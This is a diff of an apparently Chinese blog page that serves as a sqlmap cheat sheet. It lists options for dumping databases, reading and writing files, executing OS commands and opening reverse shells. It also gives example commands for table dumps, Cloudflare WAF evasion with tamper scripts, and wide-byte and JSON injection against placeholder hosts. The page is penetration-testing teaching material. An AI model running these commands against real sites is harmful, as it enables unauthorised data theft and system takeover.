@@ -1,9 +1,9 @@
-<!DOCTYPE html><html lang="zh-CN" data-theme="dark"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0,viewport-fit=cover"><title>sqlmap | HAHA</title><meta name="author" content="haha"><meta name="copyright" content="haha"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#0d0d0d"><meta name="description" content="应用场景自动测试注入已找到的sql注入漏洞点 命令参数常用参数   参数 详解    -u “url” 注入的url   –data post请求payload   –cookie cookie注入   –dbs 列出所有数据库   -tables 列出所有表   -D 指定数据库   -T 指定表   -C 指定字段   –dump 跟在上面指定的参数一起使用，列出指定的数据   –sql-sh">
+<!DOCTYPE html><html lang="zh-CN" data-theme="dark"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0,viewport-fit=cover"><title>sqlmap | HAHA</title><meta name="author" content="haha"><meta name="copyright" content="haha"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#0d0d0d"><meta name="description" content="应用场景 自动测试注入已找到的sql注入漏洞点 命令参数 常用参数    参数 详解     -u “url” 注入的url   –data post请求payload   –cookie cookie注入   –dbs 列出所有数据库   -tables 列出所有表   -D 指定数据库   -T 指定表   -C 指定字段   –dump 跟在上面指定的参数一起使用，列出指定的数据   –sq">
 <meta property="og:type" content="article">
 <meta property="og:title" content="sqlmap">
 <meta property="og:url" content="http://w00123.github.io/2025/03/05/sqlmap/index.html">
 <meta property="og:site_name" content="HAHA">
-<meta property="og:description" content="应用场景自动测试注入已找到的sql注入漏洞点 命令参数常用参数   参数 详解    -u “url” 注入的url   –data post请求payload   –cookie cookie注入   –dbs 列出所有数据库   -tables 列出所有表   -D 指定数据库   -T 指定表   -C 指定字段   –dump 跟在上面指定的参数一起使用，列出指定的数据   –sql-sh">
+<meta property="og:description" content="应用场景 自动测试注入已找到的sql注入漏洞点 命令参数 常用参数    参数 详解     -u “url” 注入的url   –data post请求payload   –cookie cookie注入   –dbs 列出所有数据库   -tables 列出所有表   -D 指定数据库   -T 指定表   -C 指定字段   –dump 跟在上面指定的参数一起使用，列出指定的数据   –sq">
 <meta property="og:locale" content="zh_CN">
 <meta property="og:image" content="http://w00123.github.io/img/%E6%A4%B0%E5%AD%90%E6%A0%91.jpg">
 <meta property="article:published_time" content="2025-03-05T03:32:24.000Z">
@@ -152,153 +152,188 @@
         }
       }
       detectApple()
-    })(window)</script><link rel="stylesheet" href="/css/custom.css"><link rel="stylesheet" href="/css/weibo.css"><!-- hexo injector head_end start --><link rel="stylesheet" href="https://cdn.jsdelivr.net/gh/Zfour/Butterfly-swiper/swiper/swiper.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/gh/Zfour/Butterfly-swiper/swiper/swiperstyle.css"><!-- hexo injector head_end end --><meta name="generator" content="Hexo 7.3.0"></head><body><div id="web_bg"></div><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="avatar-img is-center"><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/img/head1.png" onerror="onerror=null;src='/img/friend_404.gif'" alt="avatar"/></div><div class="sidebar-site-data site-data is-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">70</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">76</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">35</div></a></div><hr class="custom-hr"/><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 首页</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> 文章</span></a></div><div class="menus_item"><a class="site-page" href="/%E5%A3%81%E7%BA%B8/"><i class="fa-fw fas fa-image"></i><span> 壁纸</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> 分类</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> 标签</span></a></div></div></div></div><div class="post" id="body-wrap"><header class="post-bg" id="page-header" style="background-image: url('/img/%E6%A4%B0%E5%AD%90%E6%A0%91.jpg')"><nav id="nav"><span id="blog-info"><a href="/" title="HAHA"><span class="site-name">HAHA</span></a></span><div id="menus"><div id="search-button"><a class="site-page social-icon search" href="javascript:void(0);"><i class="fas fa-search fa-fw"></i><span> 搜索</span></a></div><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 首页</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> 文章</span></a></div><div class="menus_item"><a class="site-page" href="/%E5%A3%81%E7%BA%B8/"><i class="fa-fw fas fa-image"></i><span> 壁纸</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> 分类</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> 标签</span></a></div></div><div id="toggle-menu"><a class="site-page" href="javascript:void(0);"><i class="fas fa-bars fa-fw"></i></a></div></div></nav><div id="post-info"><h1 class="post-title">sqlmap</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">发表于</span><time class="post-meta-date-created" datetime="2025-03-05T03:32:24.000Z" title="发表于 2025-03-05 11:32:24">2025-03-05</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">更新于</span><time class="post-meta-date-updated" datetime="2025-03-05T09:00:38.000Z" title="更新于 2025-03-05 17:00:38">2025-03-05</time></span></div><div class="meta-secondline"><span class="post-meta-separator">|</span><span class="post-meta-pv-cv" id="" data-flag-title="sqlmap"><i class="far fa-eye fa-fw post-meta-icon"></i><span class="post-meta-label">阅读量:</span><span id="busuanzi_value_page_pv"><i class="fa-solid fa-spinner fa-spin"></i></span></span></div></div></div></header><main class="layout" id="content-inner"><div id="post"><article class="post-content" id="article-container"><h2 id="应用场景"><a href="#应用场景" class="headerlink" title="应用场景"></a>应用场景</h2><p>自动测试注入已找到的sql注入漏洞点</p>
-<h2 id="命令参数"><a href="#命令参数" class="headerlink" title="命令参数"></a>命令参数</h2><h3 id="常用参数"><a href="#常用参数" class="headerlink" title="常用参数"></a>常用参数</h3><table>
+    })(window)</script><link rel="stylesheet" href="/css/custom.css"><link rel="stylesheet" href="/css/weibo.css"><!-- hexo injector head_end start --><link rel="stylesheet" href="https://cdn.jsdelivr.net/gh/Zfour/Butterfly-swiper/swiper/swiper.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/gh/Zfour/Butterfly-swiper/swiper/swiperstyle.css"><!-- hexo injector head_end end --><meta name="generator" content="Hexo 7.3.0"></head><body><div id="web_bg"></div><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="avatar-img is-center"><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/img/head1.png" onerror="onerror=null;src='/img/friend_404.gif'" alt="avatar"/></div><div class="sidebar-site-data site-data is-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">71</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">78</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">36</div></a></div><hr class="custom-hr"/><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 首页</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> 文章</span></a></div><div class="menus_item"><a class="site-page" href="/%E5%A3%81%E7%BA%B8/"><i class="fa-fw fas fa-image"></i><span> 壁纸</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> 分类</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> 标签</span></a></div></div></div></div><div class="post" id="body-wrap"><header class="post-bg" id="page-header" style="background-image: url('/img/%E6%A4%B0%E5%AD%90%E6%A0%91.jpg')"><nav id="nav"><span id="blog-info"><a href="/" title="HAHA"><span class="site-name">HAHA</span></a></span><div id="menus"><div id="search-button"><a class="site-page social-icon search" href="javascript:void(0);"><i class="fas fa-search fa-fw"></i><span> 搜索</span></a></div><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 首页</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> 文章</span></a></div><div class="menus_item"><a class="site-page" href="/%E5%A3%81%E7%BA%B8/"><i class="fa-fw fas fa-image"></i><span> 壁纸</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> 分类</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> 标签</span></a></div></div><div id="toggle-menu"><a class="site-page" href="javascript:void(0);"><i class="fas fa-bars fa-fw"></i></a></div></div></nav><div id="post-info"><h1 class="post-title">sqlmap</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">发表于</span><time class="post-meta-date-created" datetime="2025-03-05T03:32:24.000Z" title="发表于 2025-03-05 11:32:24">2025-03-05</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">更新于</span><time class="post-meta-date-updated" datetime="2025-03-05T09:00:38.000Z" title="更新于 2025-03-05 17:00:38">2025-03-05</time></span></div><div class="meta-secondline"><span class="post-meta-separator">|</span><span class="post-meta-pv-cv" id="" data-flag-title="sqlmap"><i class="far fa-eye fa-fw post-meta-icon"></i><span class="post-meta-label">阅读量:</span><span id="busuanzi_value_page_pv"><i class="fa-solid fa-spinner fa-spin"></i></span></span></div></div></div></header><main class="layout" id="content-inner"><div id="post"><article class="post-content" id="article-container"><h2 id="应用场景">应用场景</h2>
+<p>自动测试注入已找到的sql注入漏洞点</p>
+<h2 id="命令参数">命令参数</h2>
+<h3 id="常用参数">常用参数</h3>
+<table>
 <thead>
 <tr>
-<th align="center">参数</th>
-<th align="left">详解</th>
+<th style="text-align:center">参数</th>
+<th style="text-align:left">详解</th>
 </tr>
 </thead>
-<tbody><tr>
-<td align="center">-u “url”</td>
-<td align="left">注入的url</td>
+<tbody>
+<tr>
+<td style="text-align:center">-u “url”</td>
+<td style="text-align:left">注入的url</td>
 </tr>
 <tr>
-<td align="center">–data</td>
-<td align="left">post请求payload</td>
+<td style="text-align:center">–data</td>
+<td style="text-align:left">post请求payload</td>
 </tr>
 <tr>
-<td align="center">–cookie</td>
-<td align="left">cookie注入</td>
+<td style="text-align:center">–cookie</td>
+<td style="text-align:left">cookie注入</td>
 </tr>
 <tr>
-<td align="center">–dbs</td>
-<td align="left">列出所有数据库</td>
+<td style="text-align:center">–dbs</td>
+<td style="text-align:left">列出所有数据库</td>
 </tr>
 <tr>
-<td align="center">-tables</td>
-<td align="left">列出所有表</td>
+<td style="text-align:center">-tables</td>
+<td style="text-align:left">列出所有表</td>
 </tr>
 <tr>
-<td align="center">-D</td>
-<td align="left">指定数据库</td>
+<td style="text-align:center">-D</td>
+<td style="text-align:left">指定数据库</td>
 </tr>
 <tr>
-<td align="center">-T</td>
-<td align="left">指定表</td>
+<td style="text-align:center">-T</td>
+<td style="text-align:left">指定表</td>
 </tr>
 <tr>
-<td align="center">-C</td>
-<td align="left">指定字段</td>
+<td style="text-align:center">-C</td>
+<td style="text-align:left">指定字段</td>
 </tr>
 <tr>
-<td align="center">–dump</td>
-<td align="left">跟在上面指定的参数一起使用，列出指定的数据</td>
+<td style="text-align:center">–dump</td>
+<td style="text-align:left">跟在上面指定的参数一起使用，列出指定的数据</td>
 </tr>
 <tr>
-<td align="center">–sql-shell</td>
-<td align="left">写shell</td>
+<td style="text-align:center">–sql-shell</td>
+<td style="text-align:left">写shell</td>
 </tr>
 <tr>
-<td align="center">–batch</td>
-<td align="left">默认选择y</td>
+<td style="text-align:center">–batch</td>
+<td style="text-align:left">默认选择y</td>
 </tr>
 <tr>
-<td align="center">–eta</td>
-<td align="left">盲注，显示时间和优化</td>
+<td style="text-align:center">–eta</td>
+<td style="text-align:left">盲注，显示时间和优化</td>
 </tr>
 <tr>
-<td align="center">–os-cmd&#x3D;id</td>
-<td align="left">执行系统命令</td>
+<td style="text-align:center">–os-cmd=id</td>
+<td style="text-align:left">执行系统命令</td>
 </tr>
 <tr>
-<td align="center">–os-shell</td>
-<td align="left">系统交互shell</td>
+<td style="text-align:center">–os-shell</td>
+<td style="text-align:left">系统交互shell</td>
 </tr>
 <tr>
-<td align="center">–os-pwn</td>
-<td align="left">反弹shell</td>
+<td style="text-align:center">–os-pwn</td>
+<td style="text-align:left">反弹shell</td>
 </tr>
 <tr>
-<td align="center">–referer</td>
-<td align="left">使用referer欺骗</td>
+<td style="text-align:center">–referer</td>
+<td style="text-align:left">使用referer欺骗</td>
 </tr>
 <tr>
-<td align="center">–users</td>
-<td align="left">列数据库所有用户</td>
+<td style="text-align:center">–users</td>
+<td style="text-align:left">列数据库所有用户</td>
 </tr>
 <tr>
-<td align="center">–threads</td>
-<td align="left">多线程</td>
+<td style="text-align:center">–threads</td>
+<td style="text-align:left">多线程</td>
 </tr>
 <tr>
-<td align="center">–file-read</td>
-<td align="left">读指定文件</td>
+<td style="text-align:center">–file-read</td>
+<td style="text-align:left">读指定文件</td>
 </tr>
 <tr>
-<td align="center">–file-write</td>
-<td align="left">写入指定文件</td>
+<td style="text-align:center">–file-write</td>
+<td style="text-align:left">写入指定文件</td>
 </tr>
-</tbody></table>
+</tbody>
+</table>
 <blockquote>
 <p>示例</p>
 </blockquote>
 <ol>
-<li>post请求插入请求表单<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u &quot;url&quot; --data=&quot;id=1&amp;&quot; --batch</span><br></pre></td></tr></table></figure></li>
-<li>列出数据库系统用户<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u &quot;url&quot; --users -v 0</span><br></pre></td></tr></table></figure></li>
-<li>列出所有数据库名称<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u &quot;url&quot; --dbs --batch</span><br></pre></td></tr></table></figure></li>
-<li>列出指定数据库的表<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u &quot;url&quot; --tables -D &quot;数据库名称&quot; -tables --batch</span><br></pre></td></tr></table></figure></li>
-<li>列出指定表的数据<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u &quot;url&quot; --tables -D &quot;数据库名称&quot; -T &quot;表名&quot; --dump --batch</span><br></pre></td></tr></table></figure></li>
+<li>post请求插入请求表单</li>
 </ol>
-<h3 id="安全参数"><a href="#安全参数" class="headerlink" title="安全参数"></a>安全参数</h3><table>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u &quot;url&quot; --data=&quot;id=1&amp;&quot; --batch</span><br></pre></td></tr></table></figure>
+<ol start="2">
+<li>列出数据库系统用户</li>
+</ol>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u &quot;url&quot; --users -v 0</span><br></pre></td></tr></table></figure>
+<ol start="3">
+<li>列出所有数据库名称</li>
+</ol>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u &quot;url&quot; --dbs --batch</span><br></pre></td></tr></table></figure>
+<ol start="4">
+<li>列出指定数据库的表</li>
+</ol>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u &quot;url&quot; --tables -D &quot;数据库名称&quot; -tables --batch</span><br></pre></td></tr></table></figure>
+<ol start="5">
+<li>列出指定表的数据</li>
+</ol>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u &quot;url&quot; --tables -D &quot;数据库名称&quot; -T &quot;表名&quot; --dump --batch</span><br></pre></td></tr></table></figure>
+<h3 id="安全参数">安全参数</h3>
+<table>
 <thead>
 <tr>
-<th align="center">参数</th>
-<th align="left">详解</th>
+<th style="text-align:center">参数</th>
+<th style="text-align:left">详解</th>
 </tr>
 </thead>
-<tbody><tr>
-<td align="center">-proxy “url,url”</td>
-<td align="left">代理</td>
+<tbody>
+<tr>
+<td style="text-align:center">-proxy “url,url”</td>
+<td style="text-align:left">代理</td>
 </tr>
 <tr>
-<td align="center">–tamper</td>
-<td align="left">Tamper 脚本,混淆 Payload</td>
+<td style="text-align:center">–tamper</td>
+<td style="text-align:left">Tamper 脚本,混淆 Payload</td>
 </tr>
 <tr>
-<td align="center">–chunked</td>
-<td align="left">分块传输编码</td>
+<td style="text-align:center">–chunked</td>
+<td style="text-align:left">分块传输编码</td>
 </tr>
 <tr>
-<td align="center">–random-agent</td>
-<td align="left">随机化 HTTP 头</td>
+<td style="text-align:center">–random-agent</td>
+<td style="text-align:left">随机化 HTTP 头</td>
 </tr>
 <tr>
-<td align="center">–delay&#x3D;5</td>
-<td align="left">请求延迟</td>
+<td style="text-align:center">–delay=5</td>
+<td style="text-align:left">请求延迟</td>
 </tr>
 <tr>
-<td align="center">–headers</td>
-<td align="left">–headers&#x3D;”X-Forwarded-For:1.1.1.1”添加自定义 HTTP 头</td>
+<td style="text-align:center">–headers</td>
+<td style="text-align:left">–headers=&quot;X-Forwarded-For:1.1.1.1&quot;添加自定义 HTTP 头</td>
 </tr>
 <tr>
-<td align="center">–charset</td>
-<td align="left">强制指定字符集,绕过转义字符</td>
+<td style="text-align:center">–charset</td>
+<td style="text-align:left">强制指定字符集,绕过转义字符</td>
 </tr>
-</tbody></table>
+</tbody>
+</table>
 <blockquote>
 <p>示例</p>
 </blockquote>
 <ol>
-<li>绕过 Cloudflare WAF<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u &quot;http://XXXXXXX.com?id=1&quot; \</span><br><span class="line">  --tamper=space2comment,randomcase,versionedmorekeywords \</span><br><span class="line">  --random-agent \</span><br><span class="line">  --delay=3 \</span><br><span class="line">  --dbms=MySQL \</span><br><span class="line">  --level=5 \</span><br><span class="line">  --risk=3</span><br></pre></td></tr></table></figure></li>
-<li>GBK 宽字节注入<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u &quot;http://XXXXXXX.com?id=1%df%27&quot; \</span><br><span class="line">  --charset=gbk \</span><br><span class="line">  --tamper=unmagicquotes \</span><br><span class="line">  --dbms=MySQL \</span><br><span class="line">  --dbs</span><br></pre></td></tr></table></figure></li>
-<li>JSON 参数注入<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u &quot;http://target.com/api&quot; \</span><br><span class="line">  --data=&#x27;&#123;&quot;id&quot;:&quot;1*&quot;&#125;&#x27; \</span><br><span class="line">  --param-del=&quot;:&quot; \</span><br><span class="line">  --headers=&quot;Content-Type: application/json&quot; \</span><br><span class="line">  --dbms=MySQL</span><br></pre></td></tr></table></figure></li>
+<li>绕过 Cloudflare WAF</li>
 </ol>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u &quot;http://XXXXXXX.com?id=1&quot; \</span><br><span class="line">  --tamper=space2comment,randomcase,versionedmorekeywords \</span><br><span class="line">  --random-agent \</span><br><span class="line">  --delay=3 \</span><br><span class="line">  --dbms=MySQL \</span><br><span class="line">  --level=5 \</span><br><span class="line">  --risk=3</span><br></pre></td></tr></table></figure>
+<ol start="2">
+<li>GBK 宽字节注入</li>
+</ol>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u &quot;http://XXXXXXX.com?id=1%df%27&quot; \</span><br><span class="line">  --charset=gbk \</span><br><span class="line">  --tamper=unmagicquotes \</span><br><span class="line">  --dbms=MySQL \</span><br><span class="line">  --dbs</span><br></pre></td></tr></table></figure>
+<ol start="3">
+<li>JSON 参数注入</li>
+</ol>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u &quot;http://target.com/api&quot; \</span><br><span class="line">  --data=&#x27;&#123;&quot;id&quot;:&quot;1*&quot;&#125;&#x27; \</span><br><span class="line">  --param-del=&quot;:&quot; \</span><br><span class="line">  --headers=&quot;Content-Type: application/json&quot; \</span><br><span class="line">  --dbms=MySQL</span><br></pre></td></tr></table></figure>
 <blockquote>
-<p>-v #详细的等级(0-6)<br>0：只显示Python的回溯，错误和关键消息。<br>1：显示信息和警告消息。<br>2：显示调试消息。<br>3：有效载荷注入。<br>4：显示HTTP请求。<br>5：显示HTTP响应头。<br>6：显示HTTP响应页面的内容</p>
+<p>-v #详细的等级(0-6)<br>
+0：只显示Python的回溯，错误和关键消息。<br>
+1：显示信息和警告消息。<br>
+2：显示调试消息。<br>
+3：有效载荷注入。<br>
+4：显示HTTP请求。<br>
+5：显示HTTP响应头。<br>
+6：显示HTTP响应页面的内容</p>
 </blockquote>
-</article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta"><i class="fas fa-circle-user fa-fw"></i>文章作者: </span><span class="post-copyright-info"><a href="http://w00123.github.io">haha</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta"><i class="fas fa-square-arrow-up-right fa-fw"></i>文章链接: </span><span class="post-copyright-info"><a href="http://w00123.github.io/2025/03/05/sqlmap/">http://w00123.github.io/2025/03/05/sqlmap/</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta"><i class="fas fa-circle-exclamation fa-fw"></i>版权声明: </span><span class="post-copyright-info">本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank">CC BY-NC-SA 4.0</a> 许可协议。转载请注明来自 <a href="http://w00123.github.io" target="_blank">HAHA</a>！</span></div></div><div class="tag_share"><div class="post-meta__tag-list"></div><div class="post_share"></div></div><nav class="pagination-post" id="pagination"><div class="prev-post pull-left"><a href="/2025/03/20/astrbot-ai%E6%8E%A5%E5%85%A5%E5%BE%AE%E4%BF%A1%E5%92%8Cqq/" title="astrbot-ai接入微信和qq"><img class="cover" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/img/%E6%A4%B0%E5%AD%90%E6%A0%91.jpg" onerror="onerror=null;src='/img/404.jpg'" alt="cover of previous post"><div class="pagination-info"><div class="label">上一篇</div><div class="prev_info">astrbot-ai接入微信和qq</div></div></a></div><div class="next-post pull-right"><a href="/2025/02/27/sql%E6%B3%A8%E5%85%A5/" title="sql注入-pikachu"><img class="cover" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/img/%E6%A4%B0%E5%AD%90%E6%A0%91.jpg" onerror="onerror=null;src='/img/404.jpg'" alt="cover of next post"><div class="pagination-info"><div class="label">下一篇</div><div class="next_info">sql注入-pikachu</div></div></a></div></nav></div><div class="aside-content" id="aside-content"><div class="card-widget card-info"><div class="is-center"><div class="avatar-img"><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/img/head1.png" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/></div><div class="author-info__name">haha</div><div class="author-info__description"></div></div><div class="card-info-data site-data is-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">70</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">76</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">35</div></a></div><a id="card-info-btn" target="_blank" rel="noopener" href="https://github.com/w00123"><i class="fab fa-github"></i><span>Follow Me</span></a></div><div class="card-widget card-announcement"><div class="item-headline"><i class="fas fa-bullhorn fa-shake"></i><span>公告</span></div><div class="announcement_content">放假!快快放假！！！</div></div><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="fas fa-stream"></i><span>目录</span><span class="toc-percentage"></span></div><div class="toc-content"><ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%BA%94%E7%94%A8%E5%9C%BA%E6%99%AF"><span class="toc-number">1.</span> <span class="toc-text">应用场景</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%91%BD%E4%BB%A4%E5%8F%82%E6%95%B0"><span class="toc-number">2.</span> <span class="toc-text">命令参数</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%B8%B8%E7%94%A8%E5%8F%82%E6%95%B0"><span class="toc-number">2.1.</span> <span class="toc-text">常用参数</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%AE%89%E5%85%A8%E5%8F%82%E6%95%B0"><span class="toc-number">2.2.</span> <span class="toc-text">安全参数</span></a></li></ol></li></ol></div></div></div></div></main><footer id="footer"><div id="footer-wrap"><div class="copyright">&copy;2020 - 2025 By haha</div><div class="framework-info"><span>框架 </span><a target="_blank" rel="noopener" href="https://hexo.io">Hexo</a><span class="footer-separator">|</span><span>主题 </span><a target="_blank" rel="noopener" href="https://github.com/jerryc127/hexo-theme-butterfly">Butterfly</a></div></div></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="阅读模式"><i class="fas fa-book-open"></i></button><button id="darkmode" type="button" title="浅色和深色模式转换"><i class="fas fa-adjust"></i></button><button id="hide-aside-btn" type="button" title="单栏和双栏切换"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="rightside-config" type="button" title="设置"><i class="fas fa-cog fa-spin"></i></button><button class="close" id="mobile-toc-button" type="button" title="目录"><i class="fas fa-list-ul"></i></button><button id="go-up" type="button" title="回到顶部"><span class="scroll-percent"></span><i class="fas fa-arrow-up"></i></button></div></div><div><script src="/js/utils.js?v=4.13.0"></script><script src="/js/main.js?v=4.13.0"></script><script src="https://cdn.jsdelivr.net/npm/@fancyapps/ui@5.0.33/dist/fancybox/fancybox.umd.min.js"></script><script src="https://cdn.jsdelivr.net/npm/vanilla-lazyload@17.8.8/dist/lazyload.iife.min.js"></script><div class="js-pjax"></div><script src="/js/weibo.js"></script><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1.1.3/dist/activate-power-mode.min.js"></script><script>POWERMODE.colorful = true;
+</article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta"><i class="fas fa-circle-user fa-fw"></i>文章作者: </span><span class="post-copyright-info"><a href="http://w00123.github.io">haha</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta"><i class="fas fa-square-arrow-up-right fa-fw"></i>文章链接: </span><span class="post-copyright-info"><a href="http://w00123.github.io/2025/03/05/sqlmap/">http://w00123.github.io/2025/03/05/sqlmap/</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta"><i class="fas fa-circle-exclamation fa-fw"></i>版权声明: </span><span class="post-copyright-info">本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank">CC BY-NC-SA 4.0</a> 许可协议。转载请注明来自 <a href="http://w00123.github.io" target="_blank">HAHA</a>！</span></div></div><div class="tag_share"><div class="post-meta__tag-list"></div><div class="post_share"></div></div><nav class="pagination-post" id="pagination"><div class="prev-post pull-left"><a href="/2025/03/20/astrbot-ai%E6%8E%A5%E5%85%A5%E5%BE%AE%E4%BF%A1%E5%92%8Cqq/" title="astrbot-ai接入微信和qq"><img class="cover" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/img/%E6%A4%B0%E5%AD%90%E6%A0%91.jpg" onerror="onerror=null;src='/img/404.jpg'" alt="cover of previous post"><div class="pagination-info"><div class="label">上一篇</div><div class="prev_info">astrbot-ai接入微信和qq</div></div></a></div><div class="next-post pull-right"><a href="/2025/02/27/sql%E6%B3%A8%E5%85%A5/" title="sql注入-pikachu"><img class="cover" src= 